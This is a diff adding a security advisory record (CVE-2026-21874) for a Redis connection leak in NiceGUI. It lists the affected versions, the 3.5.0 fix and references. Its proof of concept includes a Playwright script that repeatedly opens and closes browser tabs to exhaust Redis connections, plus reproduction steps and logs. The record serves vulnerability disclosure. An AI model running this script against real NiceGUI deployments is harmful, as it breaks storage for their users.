@@ -1,0 +1,100 @@
+{
+  "id": "GHSA-mp55-g7pj-rvm2",
+  "modified": "2026-01-08T20:57:09.660112Z",
+  "published": "2026-01-08T20:27:41Z",
+  "aliases": [
+    "CVE-2026-21874"
+  ],
+  "summary": "NiceGUI has Redis connection leak via tab storage causes service degradation",
+  "details": "### Summary\nAn unauthenticated attacker can exhaust Redis connections by repeatedly opening and closing browser tabs on any NiceGUI application using Redis-backed storage. Connections are never released, leading to service degradation when Redis hits its connection limit.\n**NiceGUI continues accepting new connections - errors are logged but the app stays up with broken storage functionality.**\n\n### Details\nWhen a client disconnects, tab_id is cleared at https://github.com/zauberzeug/nicegui/blob/main/nicegui/client.py#L307 before delete() is called at https://github.com/zauberzeug/nicegui/blob/main/nicegui/client.py#L319. By then tab_id is None, so there's no way to find the RedisPersistentDict and call https://github.com/zauberzeug/nicegui/blob/main/nicegui/persistence/redis_persistent_dict.py#L92.\n\nEach tab creates a RedisPersistentDict with a Redis client connection and a pubsub subscription. These are never closed, accumulating until Redis maxclients is reached.\n\n### PoC\n#### Test server (test_connection_leak.py)\n\n```python\nimport os\nimport logging\nfrom datetime import timedelta\n\nimport redis\nfrom nicegui import ui, app\nfrom nicegui.client import Client\n\nlogging.basicConfig(level=logging.WARNING, format=\"%(asctime)s %(levelname)s %(message)s\")\nlogging.getLogger(\"leak\").setLevel(logging.INFO)\nlog = logging.getLogger(\"leak\")\n\n_original_handle_disconnect = Client.handle_disconnect\n_original_delete = Client.delete\n\n\ndef _patched_handle_disconnect(self, socket_id: str) -\u003e None:\n    tab_id_before = self.tab_id\n    _original_handle_disconnect(self, socket_id)\n    log.warning(\"disconnect: tab_id=%s cleared, tabs=%d\", tab_id_before, len(app.storage._tabs))\n\n\ndef _patched_delete(self) -\u003e None:\n    tab_id = self.tab_id\n    tabs_before = len(app.storage._tabs)\n    _original_delete(self)\n    log.error(\"delete: tab_id=%s, tabs=%d-\u003e%d\", tab_id, tabs_before, len(app.storage._tabs))\n\n\nClient.handle_disconnect = _patched_handle_disconnect\nClient.delete = _patched_delete\n\n_last_stats: tuple[int, int] = (0, 0)\n\n\ndef log_stats() -\u003e None:\n    global _last_stats\n    client = redis.from_url(os.environ[\"NICEGUI_REDIS_URL\"])\n    conns = client.info(\"clients\")[\"connected_clients\"]\n    client.close()\n    tabs = len(app.storage._tabs)\n    if (conns, tabs) != _last_stats:\n        log.info(\"stats: conns=%d tabs=%d\", conns, tabs)\n        _last_stats = (conns, tabs)\n\n\n@ui.page(\"/\")\nasync def main():\n    await ui.context.client.connected()\n    app.storage.tab[\"visited\"] = True\n    ui.label(\"Check logs\")\n    ui.timer(interval=2.0, callback=log_stats)\n\n\nif __name__ == \"__main__\":\n    app.storage.max_tab_storage_age = timedelta(days=30).total_seconds()\n    ui.run(storage_secret=\"test\", reconnect_timeout=2.0, reload=False)\n```\n\n#### Attack script (attack_connection_leak.py)\n\n```python\nimport asyncio\nfrom playwright.async_api import async_playwright\n\n\nasync def attack(url: str, num_tabs: int) -\u003e None:\n    async with async_playwright() as p:\n        browser = await p.chromium.launch(headless=True)\n        for i in range(num_tabs):\n            context = await browser.new_context()\n            page = await context.new_page()\n            try:\n                await page.goto(url, wait_until=\"domcontentloaded\", timeout=10000)\n                await page.wait_for_timeout(500)\n            except Exception:\n                pass\n            await context.close()\n        await browser.close()\n\n\nif __name__ == \"__main__\":\n    asyncio.run(attack(url=\"http://127.0.0.1:8080/\", num_tabs=100))\n```\n\n#### Steps to reproduce\n\n1. Limit Redis connections: `redis-cli CONFIG SET maxclients 50`\n2. Start server: `NICEGUI_REDIS_URL=redis://localhost:6379/0 python test_connection_leak.py`\n3. Run attack: `python attack_connection_leak.py`\n4. Observe server logs - Redis refuses connections:\n```\nNiceGUI ready to go on http://localhost:8080, http://10.201.1.10:8080, http://127.94.0.1:8080, http://127.94.0.2:8080, and http://192.168.0.15:8080\n2026-01-01 17:19:43,226 INFO stats: conns=12 tabs=1\n2026-01-01 17:19:45,945 INFO stats: conns=14 tabs=1\n2026-01-01 17:21:14,504 INFO stats: conns=16 tabs=2\n2026-01-01 17:21:14,506 WARNING disconnect: tab_id=4c1fc610-0fa9-4e8f-bb7a-c7882d22e599 cleared, tabs=2\n2026-01-01 17:21:16,339 INFO stats: conns=19 tabs=3\n2026-01-01 17:21:16,963 ERROR delete: tab_id=None, tabs=3-\u003e3\n2026-01-01 17:21:16,964 WARNING disconnect: tab_id=e62f8ff3-9b91-431c-a66e-ce64dc37fc41 cleared, tabs=3\n2026-01-01 17:21:17,563 INFO stats: conns=20 tabs=3\n2026-01-01 17:21:18,342 INFO stats: conns=21 tabs=3\n2026-01-01 17:21:19,397 INFO stats: conns=23 tabs=4\n2026-01-01 17:21:20,022 ERROR delete: tab_id=None, tabs=4-\u003e4\n2026-01-01 17:21:20,022 WARNING disconnect: tab_id=acafc0de-83bd-4919-8a78-e7775eb5b0cb cleared, tabs=4\n2026-01-01 17:21:21,952 INFO stats: conns=27 tabs=5\n2026-01-01 17:21:23,204 ERROR delete: tab_id=None, tabs=5-\u003e5\n2026-01-01 17:21:23,204 WARNING disconnect: tab_id=56df6fab-7342-4823-8cc4-0e997d9da40a cleared, tabs=5\n2026-01-01 17:21:23,829 INFO stats: conns=28 tabs=5\n2026-01-01 17:21:25,280 INFO stats: conns=29 tabs=5\n2026-01-01 17:21:25,881 ERROR delete: tab_id=None, tabs=5-\u003e5\n2026-01-01 17:21:26,578 INFO stats: conns=30 tabs=5\n2026-01-01 17:21:27,567 INFO stats: conns=32 tabs=6\n2026-01-01 17:21:27,569 WARNING disconnect: tab_id=f1f79c1e-80ef-4753-a228-fdc13eb29e19 cleared, tabs=6\n2026-01-01 17:21:28,579 INFO stats: conns=34 tabs=6\n2026-01-01 17:21:29,449 INFO stats: conns=35 tabs=7\n2026-01-01 17:21:30,074 ERROR delete: tab_id=None, tabs=7-\u003e7\n2026-01-01 17:21:30,075 WARNING disconnect: tab_id=9f1326eb-75d8-4ea3-99fb-e47f54d45371 cleared, tabs=7\n2026-01-01 17:21:30,701 INFO stats: conns=36 tabs=7\n2026-01-01 17:21:31,454 INFO stats: conns=37 tabs=7\n2026-01-01 17:21:32,531 INFO stats: conns=40 tabs=8\n2026-01-01 17:21:33,185 ERROR delete: tab_id=None, tabs=8-\u003e8\n2026-01-01 17:21:33,185 WARNING disconnect: tab_id=5f0b0e71-0ea0-4488-b392-cda09299a8f2 cleared, tabs=8\n2026-01-01 17:21:34,436 INFO stats: conns=40 tabs=9\n2026-01-01 17:21:35,063 WARNING disconnect: tab_id=a6e014ed-e76e-449d-a6eb-e8676cca1cc5 cleared, tabs=9\n2026-01-01 17:21:35,685 INFO stats: conns=41 tabs=9\n2026-01-01 17:21:35,686 ERROR delete: tab_id=None, tabs=9-\u003e9\n2026-01-01 17:21:36,411 INFO stats: conns=42 tabs=9\n2026-01-01 17:21:37,479 INFO stats: conns=45 tabs=10\n2026-01-01 17:21:38,112 ERROR delete: tab_id=None, tabs=10-\u003e10\n2026-01-01 17:21:38,112 WARNING disconnect: tab_id=9dd7a6ca-50da-436a-966f-38c835b65f7b cleared, tabs=10\n2026-01-01 17:21:39,342 INFO stats: conns=48 tabs=11\n2026-01-01 17:21:39,600 ERROR max number of clients reached\nTraceback (most recent call last):\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/nicegui/timer.py\", line 111, in _invoke_callback\n    result = self.callback()\n  File \"/Users/dyudelevich/dev/test_connection_leak.py\", line 45, in log_stats\n    conns = client.info(\"clients\")[\"connected_clients\"]\n            ~~~~~~~~~~~^^^^^^^^^^^\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/commands/core.py\", line 1005, in info\n    return self.execute_command(\"INFO\", section, *args, **kwargs)\n           ~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/client.py\", line 657, in execute_command\n    return self._execute_command(*args, **options)\n           ~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/client.py\", line 663, in _execute_command\n    conn = self.connection or pool.get_connection()\n                              ~~~~~~~~~~~~~~~~~~~^^\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/utils.py\", line 196, in wrapper\n    return func(*args, **kwargs)\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/connection.py\", line 2601, in get_connection\n    connection.connect()\n    ~~~~~~~~~~~~~~~~~~^^\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/connection.py\", line 846, in connect\n    self.connect_check_health(check_health=True)\n    ~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/connection.py\", line 869, in connect_check_health\n    self.on_connect_check_health(check_health=check_health)\n    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/connection.py\", line 941, in on_connect_check_health\n    auth_response = self.read_response()\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/connection.py\", line 1133, in read_response\n    response = self._parser.read_response(disable_decoding=disable_decoding)\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/_parsers/resp2.py\", line 15, in read_response\n    result = self._read_response(disable_decoding=disable_decoding)\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/_parsers/resp2.py\", line 38, in _read_response\n    raise error\nredis.exceptions.ConnectionError: max number of clients reached\n2026-01-01 17:21:39,618 WARNING disconnect: tab_id=711835bb-3677-44cc-a406-abb8ae487370 cleared, tabs=11\n2026-01-01 17:21:39,618 WARNING Could not load data from Redis with key nicegui:tab-711835bb-3677-44cc-a406-abb8ae487370\n2026-01-01 17:21:40,242 INFO stats: conns=49 tabs=11\n2026-01-01 17:21:40,244 ERROR delete: tab_id=None, tabs=11-\u003e11\n2026-01-01 17:21:40,502 WARNING Could not load data from Redis with key nicegui:user-3876bd1e-5769-43ef-8c78-6e5e77ae3436\n2026-01-01 17:21:40,502 ERROR max number of clients reached\nTraceback (most recent call last):\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/nicegui/background_tasks.py\", line 93, in _handle_exceptions\n    task.result()\n    ~~~~~~~~~~~^^\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/nicegui/persistence/redis_persistent_dict.py\", line 81, in backup\n    if not await self.redis_client.exists(self.key) and not self:\n           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/asyncio/client.py\", line 720, in execute_command\n    conn = self.connection or await pool.get_connection()\n                              ^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/asyncio/connection.py\", line 1198, in get_connection\n    await self.ensure_connection(connection)\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/asyncio/connection.py\", line 1231, in ensure_connection\n    await connection.connect()\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/asyncio/connection.py\", line 298, in connect\n    await self.connect_check_health(check_health=True)\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/asyncio/connection.py\", line 324, in connect_check_health\n    await self.on_connect_check_health(check_health=check_health)\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/asyncio/connection.py\", line 410, in on_connect_check_health\n    auth_response = await self.read_response()\n                    ^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/asyncio/connection.py\", line 607, in read_response\n    response = await self._parser.read_response(\n               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n        disable_decoding=disable_decoding\n        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n    )\n    ^\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/_parsers/resp2.py\", line 82, in read_response\n    response = await self._read_response(disable_decoding=disable_decoding)\n               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n  File \"/usr/local/Caskroom/miniconda/base/lib/python3.13/site-packages/redis/_parsers/resp2.py\", line 102, in _read_response\n    raise error\nredis.exceptions.ConnectionError: max number of clients reached\n```\n2026-01-01 17:21:39,600 ERROR max number of clients reached\nredis.exceptions.ConnectionError: max number of clients reached\n\n## Impact\n\nAffects all NiceGUI deployments using Redis storage. No authentication required. Attacker opens/closes browser tabs until Redis refuses new connections. NiceGUI handles errors gracefully so the app stays up, but new users lose persistent storage (tab/user data not saved) and any Redis-dependent functionality breaks.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "nicegui",
+        "purl": "pkg:pypi/nicegui"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2.10.0"
+            },
+            {
+              "fixed": "3.5.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "2.10.0",
+        "2.10.1",
+        "2.11.0",
+        "2.11.1",
+        "2.12.0",
+        "2.12.1",
+        "2.13.0",
+        "2.14.0",
+        "2.14.1",
+        "2.15.0",
+        "2.16.0",
+        "2.16.1",
+        "2.17.0",
+        "2.18.0",
+        "2.19.0",
+        "2.20.0",
+        "2.21.0",
+        "2.21.1",
+        "2.22.0",
+        "2.22.1",
+        "2.22.2",
+        "2.23.0",
+        "2.23.1",
+        "2.23.2",
+        "2.23.3",
+        "2.24.0",
+        "2.24.1",
+        "2.24.2",
+        "3.0.0",
+        "3.0.0rc1",
+        "3.0.1",
+        "3.0.2",
+        "3.0.3",
+        "3.0.4",
+        "3.1.0",
+        "3.2.0",
+        "3.3.0",
+        "3.3.1",
+        "3.4.0",
+        "3.4.1"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 3.4.1",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-mp55-g7pj-rvm2/GHSA-mp55-g7pj-rvm2.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/zauberzeug/nicegui/security/advisories/GHSA-mp55-g7pj-rvm2"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-21874"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/zauberzeug/nicegui/commit/6c52eb2c90c4b67387c025b29646b4bc1578eb83"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/zauberzeug/nicegui"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/zauberzeug/nicegui/releases/tag/v3.5.0"
+    }
+  ]
+}
